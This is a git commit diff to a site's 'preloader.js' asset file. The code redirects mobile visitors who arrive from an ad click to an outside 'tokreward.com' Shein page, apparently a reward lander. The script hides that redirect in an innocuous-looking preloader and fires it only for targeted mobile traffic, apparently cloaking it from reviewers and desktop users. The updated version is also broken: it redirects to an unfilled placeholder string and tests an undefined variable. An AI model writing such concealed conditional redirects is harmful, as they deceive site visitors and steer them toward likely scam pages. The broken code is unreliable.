f79a927e413654620d1ca84699a68c18f7481131
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-07-20 08:25:43 -0400

    Update preloader.js

--- public/cdn/preloader.js
+++ public/cdn/preloader.js
@@ -1,5 +1,7 @@
 const utm = new URLSearchParams(window.location.search);
-const ttclid = utm.get("ttclid");
+const place = utm.get("place");
 const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-const lander = `https://tokreward.com/trshein.html?slug=${document.location.hostname.split('.')[0]}`;
-if (ttclid && mobile) { window.location.href = lander; } else { }
+const lander = `https://tokreward.com/shein.html?slug=${document.location.hostname.split('.')[0]}`;
+if (place === "__PLACEMENT__") { } 
+else if (isMobileDevice) { window.location.href = "${destinationLander}"; } 
+else { }
